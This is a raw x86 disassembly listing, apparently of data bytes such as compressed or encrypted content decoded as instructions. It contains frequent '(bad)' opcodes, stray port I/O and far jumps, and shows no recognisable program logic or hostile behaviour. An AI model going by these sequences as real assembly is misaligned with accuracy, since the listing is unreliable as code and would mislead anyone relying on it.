  41ecda:	ds add eax,esi
  41ecdd:	sub    al,bh
  41ecdf:	cs out 0x3b,eax
  41ece2:	xchg   DWORD PTR [edi+0x4e],ecx
  41ece5:	cs sbb bh,bl
  41ece8:	iret   
  41ece9:	dec    ebp
  41ecea:	jns    0x41ecb2
  41ecec:	mov    ds:0x4e,al
	...
  41ed55:	add    BYTE PTR [ecx-0xf],al
  41ed58:	(bad)
  41ed5b:	hlt    
  41ed5c:	gs icebp 
  41ed5e:	dec    edi
  41ed5f:	adc    eax,0xb52d5fd0
  41ed64:	gs mov eax,0x14b67
  41ed6a:	add    BYTE PTR [ecx],al
  41ed6c:	add    BYTE PTR [eax],al
  41ed6e:	loop   0x41ed02
  41ed70:	je     0x41ed79
  41ed72:	imul   ecx,esi,0xe948dc82
  41ed78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed79:	mov    eax,0x5ca1e0a4
  41ed7e:	enter  0xeb69,0x61
  41ed82:	and    edx,esi
  41ed84:	or     eax,0x66da45b7
  41ed89:	verr   WORD PTR [edi+0x4f7c6fe1]
  41ed90:	in     eax,0x8c
  41ed92:	push   edi
  41ed93:	sub    DWORD PTR [esi+ecx*1],ebx
  41ed96:	lock mov BYTE PTR [ebx+0x2c85086f],dl
  41ed9d:	dec    esi
  41ed9e:	or     al,0x22
  41eda0:	jmp    0x41edb3
  41eda2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eda3:	ror    DWORD PTR ds:0x71f3da56,1
  41eda9:	jg     0x41ed32
  41edab:	xor    eax,0x66c17e17
  41edb0:	ret    
  41edb1:	and    esp,DWORD PTR [eax-0x3e]
  41edb4:	leave  
  41edb5:	mov    ds:0x57ba2132,al
  41edba:	mov    edi,0x9326fda5
  41edbf:	cmp    ecx,eax
  41edc1:	inc    esp
  41edc2:	gs scas eax,DWORD PTR es:[edi]
  41edc4:	test   BYTE PTR [eax-0xae465cf],dl
  41edca:	xchg   esp,eax
  41edcb:	fimul  DWORD PTR [eax]
  41edcd:	cdq    
  41edce:	vfmadd132pd ymm3,ymm1,YMMWORD PTR [esi]
  41edd3:	jns    0x41ee22
  41edd5:	lahf   
  41edd6:	xchg   esi,eax
  41edd7:	hlt    
  41edd8:	add    edx,DWORD PTR [ebx]
  41edda:	mov    WORD PTR [edx-0x2e],gs
  41eddd:	shl    BYTE PTR [edi-0x39],cl
  41ede0:	iret   
  41ede1:	and    BYTE PTR [edi+esi*1+0x65],dl
  41ede5:	gs cwde 
  41ede7:	mov    edi,0x6962c20e
  41edec:	sub    DWORD PTR [ebx],esp
  41edee:	xchg   edx,eax
  41edef:	fisub  WORD PTR [esi+ebp*4]
  41edf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41edf3:	imul   ecx,DWORD PTR [esi],0xd2a47b30
  41edf9:	dec    esi
  41edfa:	ins    BYTE PTR es:[edi],dx
  41edfb:	rol    DWORD PTR [esi+0x1cf9b26f],0xb2
  41ee02:	pop    edx
  41ee03:	jmp    0x71ac757
  41ee08:	loop   0x41ee77
  41ee0a:	adc    bh,BYTE PTR [ecx-0x508da1a3]
  41ee10:	cmc    
  41ee11:	shl    BYTE PTR [edx-0x53cddfe3],0xab
  41ee18:	adc    esp,DWORD PTR [edi+edi*1+0x51d0c140]
  41ee1f:	ins    DWORD PTR es:[edi],dx
  41ee20:	nop
  41ee21:	cli    
  41ee22:	stos   DWORD PTR es:[edi],eax
  41ee23:	cmp    BYTE PTR [ebx+0x23f5fea0],0x4c
  41ee2a:	popa   
  41ee2b:	add    eax,0xe077ed28
  41ee30:	xlat   BYTE PTR ds:[ebx]
  41ee31:	std    
  41ee32:	int    0x9c
  41ee34:	inc    esp
  41ee35:	pusha  
  41ee36:	std    
  41ee37:	jle    0x41eea9
  41ee39:	mov    eax,ds:0xca52df34
  41ee3e:	ret    
  41ee3f:	fimul  WORD PTR [edx]
  41ee41:	mov    bh,BYTE PTR [ebx]
  41ee43:	stc    
  41ee44:	pop    ss
  41ee45:	nop
  41ee46:	xchg   edx,eax
  41ee47:	xchg   esp,eax
  41ee48:	mov    ebp,0x8a4609a9
  41ee4d:	repz jmp 0xe83c:0xf540a9dc
  41ee55:	in     al,dx
  41ee56:	mov    al,0x9f
  41ee58:	and    DWORD PTR [esi-0xb],0xddecc409
  41ee5f:	mov    edx,ss
  41ee61:	shr    esp,cl
  41ee63:	sbb    edi,DWORD PTR [ebp-0x74c27794]
  41ee69:	loopne 0x41eeae
  41ee6b:	mov    ebp,0xb02a
	...
  41eed4:	add    BYTE PTR [eax],al
  41eed6:	add    eax,0x7b197956
  41eedb:	aas    
  41eedc:	gs pop esi
  41eede:	pop    edx
  41eedf:	repnz call 0x67a4:0x47c41be7
  41eee7:	dec    esp
  41eee8:	add    DWORD PTR [eax],eax
  41eeea:	add    BYTE PTR [ecx],al
  41eeec:	add    BYTE PTR [eax],al
  41eeee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eeef:	les    esp,FWORD PTR ds:0xff14236f
  41eef5:	arpl   sp,dx
  41eef7:	sahf   
  41eef8:	and    esp,DWORD PTR [esi]
  41eefa:	(bad)  
  41eefb:	out    dx,eax
  41eefc:	add    eax,0xd95893e0
  41ef01:	out    dx,eax
  41ef02:	mov    edi,0xd830483e
  41ef07:	xchg   DWORD PTR [ebp-0xd],edi
  41ef0a:	inc    eax
  41ef0b:	mov    DWORD PTR [edi-0x671f2234],ecx
  41ef11:	and    al,BYTE PTR [edx]
  41ef13:	mov    ebp,0x41c53b4
  41ef18:	test   DWORD PTR [eax-0x7034db63],0x55c0abe0
  41ef22:	fcom   QWORD PTR [edx]
  41ef24:	ror    edi,0xed
  41ef27:	xchg   ecx,eax
  41ef28:	mov    ds:0xbea856b6,eax
  41ef2d:	mov    esi,0x8ea03295
  41ef32:	les    ecx,FWORD PTR [esi+ebp*8]
  41ef35:	jmp    0x41ef84
  41ef37:	outs   dx,DWORD PTR ds:[esi]
  41ef38:	imul   esi,DWORD PTR ds:0x3fecd1d2,0xffffffd1
  41ef3f:	ret    
  41ef40:	inc    esp
  41ef41:	inc    edx
  41ef42:	mov    edi,0x90e11ba1
  41ef47:	dec    ecx
  41ef48:	or     cl,BYTE PTR [ebx-0x2408d170]
  41ef4e:	jl     0x41ef7e
  41ef50:	cmp    esi,DWORD PTR [ecx+0x3888c515]
  41ef56:	(bad)  
  41ef57:	std    
  41ef58:	in     al,0x92
  41ef5a:	aas    
  41ef5b:	data16 mov bh,0x6
  41ef5e:	stos   BYTE PTR es:[edi],al
  41ef5f:	loope  0x41ef1f
  41ef61:	sahf   
  41ef62:	mov    ah,0xcd
  41ef64:	add    ebp,ecx
  41ef66:	scas   eax,DWORD PTR es:[edi]
  41ef67:	outs   dx,BYTE PTR ds:[si]
  41ef69:	and    BYTE PTR ds:0x3b0b3cbc,0xbc
  41ef70:	lods   eax,DWORD PTR ds:[esi]
  41ef71:	lods   eax,DWORD PTR ds:[esi]
  41ef72:	je     0x41eef6
  41ef74:	loope  0x41ef3e
  41ef76:	outs   dx,BYTE PTR ds:[esi]
  41ef77:	loope  0x41ef0d
  41ef79:	jp     0x41efdf
  41ef7b:	and    BYTE PTR [ecx-0x14],0x8c
  41ef7f:	out    dx,eax
  41ef80:	dec    ebp
  41ef81:	jge    0x41efc7
  41ef83:	popa   
  41ef84:	push   esp
  41ef85:	std    
  41ef86:	push   ecx
  41ef87:	neg    DWORD PTR [ebp-0x178c544a]
  41ef8d:	ret    0x1849
  41ef90:	and    bl,dh
  41ef92:	dec    ecx
  41ef93:	jns    0x41ef32
  41ef95:	loop   0x41ef75
  41ef97:	inc    esi
  41ef98:	test   BYTE PTR [ecx+0x5f99b1bb],bh
  41ef9e:	mov    ds:0x93419289,eax
  41efa3:	adc    BYTE PTR [edi+0x47f75f7a],dh
  41efa9:	sbb    al,0x82
  41efab:	arpl   WORD PTR [edi],sp
  41efad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efae:	or     ch,BYTE PTR [ecx]
  41efb0:	xchg   edi,eax
  41efb1:	cmp    DWORD PTR [ecx+eax*2-0x33a7b967],eax
  41efb8:	ret    
  41efb9:	jmp    0x41ef4c
  41efbb:	add    BYTE PTR [eax-0xe],bl
  41efbe:	dec    ecx
  41efbf:	add    edx,ecx
  41efc1:	jne    0x41efb9
  41efc3:	ins    BYTE PTR es:[edi],dx
  41efc4:	sub    eax,0x7f692853
  41efc9:	idiv   DWORD PTR [edx+0x63]
  41efcc:	bound  edi,QWORD PTR [edx+0x72]
  41efcf:	sbb    DWORD PTR [ecx],ecx
  41efd1:	adc    eax,0x9faf2393
  41efd6:	xor    ebx,DWORD PTR [eax]
  41efd8:	mov    es,WORD PTR [edi-0x38f7e1ff]
  41efde:	xor    BYTE PTR [edi],ah
  41efe0:	retf   0xf12d
  41efe3:	push   es
  41efe4:	push   ss
  41efe5:	rcr    DWORD PTR [esi+0x7129076b],1
  41efeb:	push   es
  41efec:	ret    
  41efed:	lds    eax,FWORD PTR [eax]
	...
  41f053:	add    BYTE PTR [eax],al
  41f055:	add    BYTE PTR [ecx-0xda40a3],bh
  41f05b:	out    0xbb,eax
  41f05d:	fisttp QWORD PTR [ecx+0x0]
  41f060:	lock imul edi,DWORD PTR [ebx],0xfffffffd
  41f064:	lahf   
  41f065:	mov    al,0x67
  41f067:	dec    ebp
  41f068:	add    DWORD PTR [eax],eax
  41f06a:	add    BYTE PTR [ecx],al
  41f06c:	add    BYTE PTR [eax],al
  41f06e:	inc    eax
  41f06f:	or     al,0x30
  41f071:	out    dx,al
  41f072:	mov    esp,0xe4c4d198
  41f077:	xchg   esi,eax
  41f078:	imul   eax,DWORD PTR [esi],0xfffffff0
  41f07b:	and    BYTE PTR [ebx+0x74],al
  41f07e:	jge    0x41f017
  41f080:	xor    al,0x78
  41f082:	fisub  WORD PTR [edx-0x78302809]
  41f088:	adc    edi,edx
  41f08a:	arpl   WORD PTR [eax+0x2ef18dea],bx
  41f090:	rcr    DWORD PTR [eax-0x18002ed],0xa1
  41f097:	dec    esi
  41f098:	rol    BYTE PTR [eax+0x4b58c16],1
  41f09e:	adc    BYTE PTR [ebp+0x641535cd],0x8f
  41f0a5:	push   ds
  41f0a6:	sub    BYTE PTR [eax-0x1e],cl
  41f0a9:	adc    DWORD PTR [esp+ebx*4-0x27bbc2ab],eax
  41f0b0:	xor    DWORD PTR [ebx],esp
  41f0b2:	test   ebx,esp
  41f0b4:	mov    bl,0x1b
  41f0b6:	out    dx,eax
  41f0b7:	shr    DWORD PTR [ebp+0x6fbfbed8],1
  41f0bd:	daa    
  41f0be:	xor    BYTE PTR [edx-0x4a],ah
  41f0c1:	jmp    0xf6a9:0xcfb01cc9
  41f0c8:	stos   DWORD PTR es:[edi],eax
  41f0c9:	adc    eax,0xe29e4ad9
  41f0ce:	inc    esi
  41f0cf:	and    ebx,esi
  41f0d1:	cmp    BYTE PTR [ebp+eax*8-0x2b],bh
  41f0d5:	sahf   
  41f0d6:	inc    edx
  41f0d7:	loope  0x41f0ca
  41f0d9:	dec    ebx
  41f0da:	push   cs
  41f0db:	outs   dx,DWORD PTR ds:[esi]
  41f0dc:	imul   ch
  41f0de:	xor    ah,0x2a
  41f0e1:	and    esp,DWORD PTR [eax-0x608b3f0]
  41f0e7:	jle    0x41f0ad
  41f0e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0ea:	cmp    BYTE PTR [ebx+0x58],ch
  41f0ed:	push   esi
  41f0ee:	out    dx,al
  41f0ef:	outs   dx,DWORD PTR ds:[esi]
  41f0f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0f1:	and    DWORD PTR [ebp-0x4fc32ab7],edx
  41f0f7:	dec    edi
  41f0f8:	das    
  41f0f9:	lods   eax,DWORD PTR ds:[esi]
  41f0fa:	jle    0x41f148
  41f0fc:	movhps xmm4,QWORD PTR [eax]
  41f0ff:	dec    ecx
  41f100:	mov    DWORD PTR [edi+0x36a767db],edx
  41f106:	(bad)  
  41f107:	stc    
  41f108:	and    ah,BYTE PTR [ebx+0x4c]
  41f10b:	std    
  41f10c:	nop
  41f10d:	loopne 0x41f0fd
  41f10f:	loopne 0x41f127
  41f111:	ins    DWORD PTR es:[edi],dx
  41f112:	pop    ecx
  41f113:	add    eax,0x993e9e06
  41f118:	inc    ecx
  41f119:	inc    eax
  41f11a:	xchg   esp,eax
  41f11b:	cs push ebx
  41f11d:	inc    ecx
  41f11e:	out    dx,eax
  41f11f:	or     bl,bl
  41f121:	call   0x78f1:0x7dc7767c
  41f128:	cdq    
  41f129:	icebp  
  41f12a:	les    esi,FWORD PTR [edx+edx*1]
  41f12d:	lock inc ecx
  41f12f:	lahf   
  41f130:	sub    BYTE PTR [ecx-0x1b8a236],bl
  41f136:	xchg   DWORD PTR [edi],esp
  41f138:	(bad)  
  41f139:	jo     0x41f156
  41f13b:	xlat   BYTE PTR ds:[ebx]
  41f13c:	jle    0x41f16b
  41f13e:	ins    DWORD PTR es:[edi],dx
  41f13f:	jae    0x41f1ab
  41f141:	inc    ebp
  41f142:	shr    eax,1
  41f144:	jno    0x41f1b7
  41f146:	mov    ebp,0x281e184c
  41f14b:	and    DWORD PTR [ebx+0x7e59c0e8],0xec4ddee7
  41f155:	je     0x41f1d0
  41f157:	pop    ds
  41f158:	fsubr  st,st(0)
  41f15a:	data16 jbe 0x41f1cb
  41f15d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f15e:	ins    DWORD PTR es:[edi],dx
  41f15f:	xchg   DWORD PTR [edi-0x23],edx
  41f162:	retf   0xf838
  41f165:	test   eax,0x82f9799a
  41f16a:	pop    edx
  41f16b:	dec    ecx
  41f16c:	ret    0xa7
	...
  41f1d3:	add    BYTE PTR [eax],al
  41f1d5:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f1db:	mov    ebx,0x3824ffdf
  41f1e0:	(bad)  
  41f1e1:	jmp    0x4e67:0x7f7e65e7
  41f1e8:	add    DWORD PTR [eax],eax
  41f1ea:	add    BYTE PTR [ecx],al
  41f1ec:	add    BYTE PTR [eax],al
  41f1ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1ef:	mov    al,0xbc
  41f1f1:	or     ebp,DWORD PTR [edx-0x4df3253d]
  41f1f7:	mov    cl,0xab
  41f1f9:	pop    ecx
  41f1fa:	add    dh,BYTE PTR [edi-0x2f]
  41f1fd:	and    cl,BYTE PTR [edx]
  41f1ff:	imul   edi,ecx,0x27
  41f202:	or     eax,0x6689edd
  41f207:	(bad)  
  41f208:	ins    BYTE PTR es:[edi],dx
  41f209:	dec    edx
  41f20a:	fmul   st,st(0)
  41f20c:	out    0x2c,eax
  41f20e:	pop    ds
  41f20f:	mov    fs,WORD PTR [ecx]
  41f211:	(bad)  
  41f212:	adc    DWORD PTR [edi-0x4b],esi
  41f215:	stos   BYTE PTR es:[edi],al
  41f216:	inc    esp
  41f217:	lods   al,BYTE PTR ds:[esi]
  41f218:	xchg   esp,eax
  41f219:	inc    ecx
  41f21a:	and    DWORD PTR [esi],edi
  41f21c:	add    BYTE PTR ds:0x167fe00e,0x39
  41f223:	sbb    ecx,0xffeb43eb
  41f229:	mov    ebx,0x3fd576b5
  41f22e:	les    ebx,FWORD PTR [edi+0x6d3db13a]
  41f234:	popf   
  41f235:	add    DWORD PTR [edx-0xc14c44],0x53
  41f23c:	cmp    dh,BYTE PTR [esi]
  41f23e:	pop    esi
  41f23f:	or     BYTE PTR [edx],bh
  41f241:	jmp    0x41f2bf
  41f243:	xchg   edx,eax
  41f244:	outs   dx,BYTE PTR ds:[esi]
  41f245:	jns    0x41f2c4
  41f247:	nop
  41f248:	xor    edi,DWORD PTR [ebx-0x17]
  41f24b:	jne    0x41f1e5
  41f24d:	scas   al,BYTE PTR es:[edi]
  41f24e:	sub    eax,0xe4f46b15
  41f253:	xor    eax,0x6c318e4e
  41f258:	push   esp
  41f259:	mov    dh,0xba
  41f25b:	std    
  41f25c:	cli    
  41f25d:	pop    edi
  41f25e:	popf   
  41f25f:	fidivr DWORD PTR [ebx-0x6d]
  41f262:	mov    ds:0x291e589b,al
  41f267:	xor    esi,ecx
  41f269:	ror    BYTE PTR ds:0xb667eeb0,1
  41f26f:	mov    ds:0x2f595504,al
  41f274:	or     al,cl
  41f276:	into   
  41f277:	jo     0x41f2f5
  41f279:	and    dl,al
  41f27b:	sbb    eax,0x223976c5
  41f280:	xchg   edi,eax
  41f281:	les    eax,FWORD PTR [ecx+ebp*1]
  41f284:	mov    edi,0x42e47955
  41f289:	xchg   BYTE PTR [ebx+eax*8-0x77],al
  41f28d:	ret    
  41f28e:	and    bl,BYTE PTR [edx+0x58f53363]
  41f294:	dec    edx
  41f295:	(bad)  
  41f296:	jg     0x41f29f
  41f298:	bnd js 0x41f303
  41f29b:	test   eax,0x90f3ed93
  41f2a0:	add    esi,DWORD PTR [eax+edi*8+0x5b0b2ccd]
  41f2a7:	dec    ebp
  41f2a8:	push   ebp
  41f2a9:	outs   dx,BYTE PTR ds:[esi]
  41f2aa:	xchg   esi,eax
  41f2ab:	dec    ecx
  41f2ac:	lods   al,BYTE PTR ds:[esi]
  41f2ad:	cdq    
  41f2ae:	cli    
  41f2af:	rcr    DWORD PTR [edi+eiz*2-0x5e49edc6],0x54
  41f2b7:	mov    DWORD PTR [edx],ebx
  41f2b9:	scas   eax,DWORD PTR es:[edi]
  41f2ba:	or     dh,cl
  41f2bc:	sbb    al,0xd2
  41f2be:	xchg   BYTE PTR [edx+0x1c9d3813],bh
  41f2c4:	sahf   
  41f2c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2c6:	pop    ecx
  41f2c7:	fistp  QWORD PTR [edx+ecx*4-0x4]
  41f2cb:	mov    BYTE PTR [ebx+edx*8-0x67fe2af8],ch
  41f2d2:	aam    0x22
  41f2d4:	jb     0x41f273
  41f2d6:	pop    esp
  41f2d7:	imul   ebx,DWORD PTR [edi],0xdf275332
  41f2dd:	pop    esi
  41f2de:	outs   dx,BYTE PTR ds:[esi]
  41f2df:	lods   al,BYTE PTR ds:[esi]
  41f2e0:	in     al,0x57
  41f2e2:	push   esi
  41f2e3:	pop    edx
  41f2e4:	mov    al,0x88
  41f2e6:	aad    0x95
  41f2e8:	inc    esi
  41f2e9:	inc    ecx
  41f2ea:	jo     0x41f34b
  41f2ec:	push   edi
  41f2ed:	pop    eax
	...
  41f356:	push   ecx
  41f357:	sbb    edi,edi
  41f359:	jmp    si
  41f35c:	fnstcw WORD PTR [edi]
  41f35e:	jo     0x41f34d
  41f360:	sahf   
  41f361:	jb     0x41f348
  41f363:	pushw  0xffb7
  41f366:	addr16 dec edi
  41f368:	add    DWORD PTR [eax],eax
  41f36a:	add    BYTE PTR [ecx],al
  41f36c:	add    BYTE PTR [eax],al
  41f36e:	shr    ch,1
  41f370:	adc    eax,0x2a26c074
  41f375:	ja     0x41f375
  41f377:	inc    BYTE PTR [esi]
  41f379:	shr    DWORD PTR [ecx],1
  41f37b:	mov    edx,0x48b7c575
  41f380:	sub    DWORD PTR [edi-0x4b],ebp
  41f383:	mov    fs,WORD PTR [eax]
  41f385:	adc    DWORD PTR [ebp+0x35a08794],0xffffffba
  41f38c:	cmp    edx,DWORD PTR [edx]
  41f38e:	jmp    0x41f3a7
  41f390:	inc    ebp
  41f391:	fisub  WORD PTR [esi+0x69]
  41f394:	mov    eax,0x5c7c8070
  41f399:	(bad)  
  41f39b:	or     ch,BYTE PTR [esi+edx*2]
  41f39e:	mov    bh,0xbf
  41f3a0:	pop    edx
  41f3a1:	test   BYTE PTR [eax],bl
  41f3a3:	lahf   
  41f3a4:	call   DWORD PTR [edi]
  41f3a6:	loop   0x41f338
  41f3a8:	sub    esp,DWORD PTR [edx-0x51]
  41f3ab:	add    BYTE PTR [edi-0x56f0a2e8],ch
  41f3b1:	ins    BYTE PTR es:[edi],dx
  41f3b2:	xchg   edi,eax
  41f3b3:	and    bl,BYTE PTR [esi+0x76]
  41f3b6:	shr    DWORD PTR [edi],1
  41f3b8:	arpl   WORD PTR fs:[esi-0x11d1acfb],bx
  41f3bf:	retf   
  41f3c0:	gs xchg ebp,eax
  41f3c2:	(bad)  
  41f3c3:	sub    eax,0xdc8518f1
  41f3c8:	xchg   esi,eax
  41f3c9:	xchg   ebx,eax
  41f3ca:	inc    esi
  41f3cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3cc:	mov    esi,0xc98890c2
  41f3d1:	sbb    esp,DWORD PTR [ebx]
  41f3d3:	mov    eax,0x98aa3369
  41f3d8:	lahf   
  41f3d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3da:	gs pop esp
  41f3dc:	cmp    esp,0xfb9a6209
  41f3e2:	adc    eax,0xdf50e7bd
  41f3e7:	mov    dl,0x1
  41f3e9:	jle    0x41f425
  41f3eb:	push   esi
  41f3ec:	mov    ds:0xac16ed3,al
  41f3f1:	imul   ecx,ebp,0x5c
  41f3f4:	push   ds
  41f3f5:	retf   
  41f3f6:	repz rol DWORD PTR [eax+0x20e4ad0a],1
  41f3fd:	mov    esi,0x7515b478
  41f402:	add    al,0xd
  41f404:	pop    ds
  41f405:	mov    bl,0x98
  41f407:	or     al,0x9b
  41f409:	repnz retf 0xa2cf
  41f40d:	std    
  41f40e:	idiv   esp
  41f410:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f411:	or     bh,ch
  41f413:	outs   dx,DWORD PTR ds:[esi]
  41f414:	jmp    0x1fb04aff
  41f419:	test   al,0x84
  41f41b:	or     al,0xa2
  41f41d:	push   0x2305685a
  41f422:	pop    edi
  41f423:	xchg   DWORD PTR [ebx-0x1cb9450a],ebp
  41f429:	dec    ebp
  41f42a:	inc    ebp
  41f42b:	in     al,dx
  41f42c:	fld    QWORD PTR [ecx+0x58ddab3]
  41f432:	jb     0x41f496
  41f434:	in     al,dx
  41f435:	sub    al,0xe4
  41f437:	xor    DWORD PTR [ebx],esp
  41f439:	xchg   edx,eax
  41f43a:	dec    DWORD PTR [ecx-0x40]
  41f43d:	adc    DWORD PTR [eax],ecx
  41f43f:	shl    DWORD PTR [ecx-0x62],cl
  41f442:	dec    ebp
  41f443:	js     0x41f439
  41f445:	cmp    DWORD PTR [eax+esi*4+0x7678fa4d],eax
  41f44c:	inc    ebp
  41f44d:	push   ds
  41f44e:	popf   
  41f44f:	xchg   esi,eax
  41f450:	dec    eax
  41f451:	mov    esi,0x2340afdb
  41f456:	gs push eax
  41f458:	fs cmc 
  41f45a:	mov    bh,0x98
  41f45c:	out    dx,eax
  41f45d:	or     eax,0x690eb9de
  41f462:	ins    BYTE PTR es:[edi],dx
  41f463:	daa    
  41f464:	or     al,0x4e
  41f466:	push   edx
  41f467:	enter  0xdc71,0x90
  41f46b:	jae    0x41f4a7
  41f46d:	sub    DWORD PTR [eax],eax
	...
  41f4d3:	add    BYTE PTR [eax],al
  41f4d5:	add    BYTE PTR [edi+eiz*8],bh
  41f4d8:	imul   ebp,edi,0xfffffffb
  41f4db:	out    dx,eax
  41f4dc:	mov    esp,0xd5fd13f7
  41f4e1:	mov    ch,0x64
  41f4e3:	fsincos 
  41f4e5:	leave  
  41f4e6:	addr16 push eax
  41f4e8:	add    DWORD PTR [eax],eax
  41f4ea:	add    BYTE PTR [ecx],al
  41f4ec:	add    BYTE PTR [eax],al
  41f4ee:	and    eax,0x3091e512
  41f4f3:	add    bl,bl
  41f4f5:	aad    0xf
  41f4f7:	xchg   ecx,eax
  41f4f8:	aam    0xba
  41f4fa:	call   0xcafc:0x91a80713
  41f501:	lea    esp,[edi+0x7b]
  41f504:	(bad)  
  41f505:	sub    dh,BYTE PTR [eax+0x70]
  41f508:	ja     0x41f4d4
  41f50a:	test   BYTE PTR ds:0x4e612ec3,bl
  41f510:	cmp    dl,BYTE PTR [edi+0x3544341f]
  41f516:	xchg   esp,eax
  41f517:	xor    BYTE PTR ds:0x15473a35,cl
  41f51e:	popf   
  41f51f:	shl    bl,1
  41f521:	mov    ebp,0xccf1433f
  41f526:	or     bl,BYTE PTR [edx]
  41f528:	pop    ss
  41f529:	sbb    eax,0x433e4f1d
  41f52e:	jns    0x41f4d5
  41f530:	jb     0x41f588
  41f532:	or     ebx,DWORD PTR [esi]
  41f534:	mov    al,ds:0x29b2e9cd
  41f539:	cmp    ecx,DWORD PTR [ebp-0x2913fe9c]
  41f53f:	sti    
  41f540:	clc    
  41f541:	jns    0x41f504
  41f543:	outs   dx,BYTE PTR ds:[esi]
  41f544:	cld    
  41f545:	sbb    ah,BYTE PTR [eax-0xf50fb48]
  41f54b:	mov    esi,0x7ae76e01
  41f550:	inc    eax
  41f551:	les    esp,FWORD PTR [edi-0x5b]
  41f554:	cmp    dl,BYTE PTR [esi]
  41f556:	dec    esp
  41f557:	adc    ecx,edi
  41f559:	fistp  QWORD PTR [edx-0x4b6101bb]
  41f55f:	repnz pop ebx
  41f561:	pop    ebx
  41f562:	fwait
  41f563:	mov    eax,ds:0x5a3bd2ee
  41f568:	pop    edx
  41f569:	jmp    0x41f596
  41f56b:	ficomp WORD PTR [edx+0x5b722258]
  41f571:	or     DWORD PTR [edi+0x18],esp
  41f574:	popf   
  41f575:	cmp    eax,0x3193e6ae
  41f57a:	jo     0x41f5c8
  41f57c:	fld    st(6)
  41f57e:	inc    eax
  41f57f:	and    bl,0xb9
  41f582:	jp     0x41f5ac
  41f584:	ret    0x556c
  41f587:	mov    bh,0xbf
  41f589:	mov    gs,WORD PTR [ebp-0x6e675f46]
  41f58f:	lahf   
  41f590:	rcr    bl,cl
  41f592:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f593:	or     ecx,DWORD PTR [edi+0x125ae946]
  41f599:	int3   
  41f59a:	icebp  
  41f59b:	aaa    
  41f59c:	sbb    DWORD PTR [eax],0x2c
  41f59f:	xchg   DWORD PTR [edi+0x2108f96f],ebx
  41f5a5:	hlt    
  41f5a6:	mov    eax,0x223eb274
  41f5ab:	mov    ebp,0x1e20ef3a
  41f5b0:	cmp    esp,DWORD PTR [ebx]
  41f5b2:	add    al,0x93
  41f5b4:	or     BYTE PTR [ebx-0x10],bh
  41f5b7:	or     esp,DWORD PTR [edi-0x4bdc16e3]
  41f5bd:	es xchg esi,eax
  41f5bf:	push   esp
  41f5c0:	imul   edi,DWORD PTR [ecx+0x1a],0x665e795f
  41f5c7:	xchg   ebp,eax
  41f5c8:	push   ebp
  41f5c9:	adc    al,0xcc
  41f5cb:	cli    
  41f5cc:	pop    edi
  41f5cd:	sbb    al,0x34
  41f5cf:	rcr    DWORD PTR [esi+0x4d],cl
  41f5d2:	rcr    DWORD PTR [ebx],1
  41f5d4:	(bad)  
  41f5d5:	into   
  41f5d6:	xor    bl,bh
  41f5d8:	sbb    DWORD PTR [ebx],esi
  41f5da:	jo     0x41f587
  41f5dc:	retf   
  41f5dd:	retf   
  41f5de:	aaa    
  41f5df:	pop    eax
  41f5e0:	pushf  
  41f5e1:	aad    0xe2
  41f5e3:	pushf  
  41f5e4:	sbb    al,0x86
  41f5e6:	and    BYTE PTR [ecx-0x34],ah
  41f5e9:	jge    0x41f656
  41f5eb:	or     BYTE PTR [edx+ebx*8],0x0
	...
  41f653:	add    BYTE PTR [eax],al
  41f655:	add    BYTE PTR [eax+0x34],bh
  41f658:	add    bh,bl
  41f65a:	dec    esi
  41f65b:	(bad)  
  41f65c:	stc    
  41f65d:	mov    bh,0xb7
  41f65f:	jmp    0x2b81:0x4440d422
  41f666:	addr16 push ecx
  41f668:	add    DWORD PTR [eax],eax
  41f66a:	add    BYTE PTR [ecx],al
  41f66c:	add    BYTE PTR [eax],al
  41f66e:	jmp    0x8584:0xa7a64bb9
  41f675:	mov    edx,0xe39be22
  41f67a:	pusha  
  41f67b:	and    eax,0x2a87e316
  41f680:	xchg   esp,eax
  41f681:	dec    edi
  41f682:	cdq    
  41f683:	ss push es
  41f685:	stos   DWORD PTR es:[edi],eax
  41f686:	fcmove st,st(3)
  41f688:	or     eax,0x26e5cb37
  41f68d:	sar    BYTE PTR [edi],1
  41f68f:	cmp    edi,edi
  41f691:	out    dx,al
  41f692:	mov    eax,ds:0xf913f6ca
  41f697:	mov    ah,0x26
  41f699:	in     eax,dx
  41f69a:	pop    ebx
  41f69b:	outs   dx,BYTE PTR ds:[esi]
  41f69c:	jg     0x41f6a9
  41f69e:	inc    esi
  41f69f:	jp     0x41f668
  41f6a1:	inc    edi
  41f6a2:	mov    WORD PTR [ebp+0x17991830],?
  41f6a8:	mov    edi,0xad16fd8b
  41f6ad:	in     al,dx
  41f6ae:	xor    BYTE PTR [edx],dl
  41f6b0:	push   0x27e3892f
  41f6b5:	shr    BYTE PTR [ebp-0x2165c3fc],1
  41f6bb:	scas   al,BYTE PTR es:[edi]
  41f6bc:	cmc    
  41f6bd:	push   ebx
  41f6be:	pop    eax
  41f6bf:	cs in  eax,dx
  41f6c1:	xchg   BYTE PTR [edi+0x6519a62f],cl
  41f6c7:	cwde   
  41f6c8:	xchg   esp,eax
  41f6c9:	es retf 
  41f6cb:	cmp    al,0x58
  41f6cd:	rcl    BYTE PTR [esi],1
  41f6cf:	les    ebp,FWORD PTR [esi+0x7f1a7cda]
  41f6d5:	rcr    dh,cl
  41f6d7:	int    0x1d
  41f6d9:	cmp    dh,BYTE PTR [eax-0x4f]
  41f6dc:	mov    al,ds:0x82f93d35
  41f6e1:	and    al,0x8d
  41f6e3:	es icebp 
  41f6e5:	pop    ebx
  41f6e6:	inc    ecx
  41f6e7:	xor    eax,0xdb073120
  41f6ec:	jmp    0x41f70a
